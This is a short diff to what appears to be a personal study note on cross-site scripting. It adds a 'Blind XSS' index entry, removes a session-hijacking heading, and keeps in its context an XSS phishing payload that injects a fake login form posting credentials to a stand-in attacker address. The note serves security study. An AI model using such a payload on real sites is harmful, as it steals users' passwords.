@@ -18,6 +18,8 @@ cssclasses:
 	- [[PERSISTENT XSS]]
 - ![](https://giffiles.alphacoders.com/222/222700.gif)
 	- [[NON-PERSISTENT XSS]]
+- ![](https://giffiles.alphacoders.com/222/222700.gif)
+	- [[BLIND XSS]]
 
 <br>
 
@@ -180,7 +182,3 @@ In order to accomplish the *phishing*, simply replace the standard *alert* paylo
 ```js
 document.body.innerHTML = '<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>'
 ```
-
----
-
-#### *Sesion Hijacking*
